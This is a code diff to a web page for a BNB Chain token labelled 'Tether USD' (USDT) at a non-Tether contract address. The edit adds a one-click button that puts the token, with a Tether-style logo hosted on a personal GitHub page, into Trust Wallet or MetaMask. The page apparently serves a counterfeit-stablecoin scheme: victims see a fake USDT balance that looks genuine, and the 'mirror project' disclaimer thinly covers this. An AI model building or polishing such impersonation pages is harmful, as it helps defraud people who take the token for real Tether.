@@ -11,8 +11,10 @@
         h1 { color: #26a17b; margin-bottom: 10px; }
         .contract-box { background: #f8f9fa; border: 1px dashed #26a17b; padding: 15px; border-radius: 10px; font-family: monospace; word-break: break-all; margin: 20px 0; font-size: 14px; }
         .info { margin: 20px 0; text-align: left; line-height: 1.6; }
-        .btn { background: #26a17b; color: white; padding: 12px 25px; text-decoration: none; border-radius: 8px; display: inline-block; font-weight: bold; margin: 10px 5px; transition: 0.3s; }
+        .btn { background: #26a17b; color: white; padding: 12px 25px; text-decoration: none; border-radius: 8px; display: inline-block; font-weight: bold; margin: 10px 5px; transition: 0.3s; border: none; cursor: pointer; }
         .btn:hover { background: #1e7e61; }
+        .btn-wallet { background: #3172de; } /* ট্রাস্ট ওয়ালেট নীল রঙের বাটন */
+        .btn-wallet:hover { background: #2659b0; }
         .footer { margin-top: 30px; font-size: 12px; color: #777; border-top: 1px solid #eee; padding-top: 20px; }
         .disclaimer { font-style: italic; background: #fff4f4; padding: 10px; border-radius: 5px; margin-top: 15px; color: #a94442; }
     </style>
@@ -37,7 +39,8 @@
     </div>
 
     <a href="https://bscscan.com/token/0xb35fa90912e7fa4a69c467272422f2770bd8e57b" target="_blank" class="btn">View on BscScan</a>
-    <a href="#" class="btn" onclick="alert('Please add manually in MetaMask using the contract address above.')">Add to Wallet</a>
+    
+    <button onclick="addToken()" class="btn btn-wallet">Add to Trust Wallet / MetaMask</button>
 
     <div class="disclaimer">
         <strong>Disclaimer:</strong> This is a community-driven mirror project for educational and utility purposes on the BNB Chain. Always verify the contract address before making any transactions. We are not responsible for any financial loss.
@@ -48,38 +51,42 @@
         Contact us at: usdtmirror.project@gmail.com
     </div>
 </div>
-<button onclick="addToken()" class="btn">Add to Wallet (Logo Support)</button>
 
 <script>
 async function addToken() {
   const tokenAddress = '0xb35fa90912e7fa4a69c467272422f2770bd8e57b';
   const tokenSymbol = 'USDT';
   const tokenDecimals = 18;
+  // লোগোর জন্য আপনার গিথাব লিঙ্ক ব্যবহার করা হয়েছে
   const tokenImage = 'https://abir1987.github.io/Tether-USDT/logo.svg';
 
-  try {
-    // was added to wallet
-    const wasAdded = await window.ethereum.request({
-      method: 'wallet_watchAsset',
-      params: {
-        type: 'ERC20', 
-        options: {
-          address: tokenAddress, 
-          symbol: tokenSymbol, 
-          decimals: tokenDecimals, 
-          image: tokenImage, 
+  if (typeof window.ethereum !== 'undefined') {
+    try {
+      const wasAdded = await window.ethereum.request({
+        method: 'wallet_watchAsset',
+        params: {
+          type: 'ERC20', 
+          options: {
+            address: tokenAddress, 
+            symbol: tokenSymbol, 
+            decimals: tokenDecimals, 
+            image: tokenImage, 
+          },
         },
-      },
-    });
+      });
 
-    if (wasAdded) {
-      alert('Tether USD added successfully!');
+      if (wasAdded) {
+        alert('Tether USD added successfully!');
+      }
+    } catch (error) {
+      console.log(error);
     }
-  } catch (error) {
-    console.log(error);
-    alert('Please open this site inside Trust Wallet or MetaMask browser.');
+  } else {
+    // যদি সাধারণ ব্রাউজারে ওপেন করা হয়
+    alert('Please open this site inside the Browser/DApp section of Trust Wallet or MetaMask app.');
   }
 }
 </script>
+
 </body>
 </html>
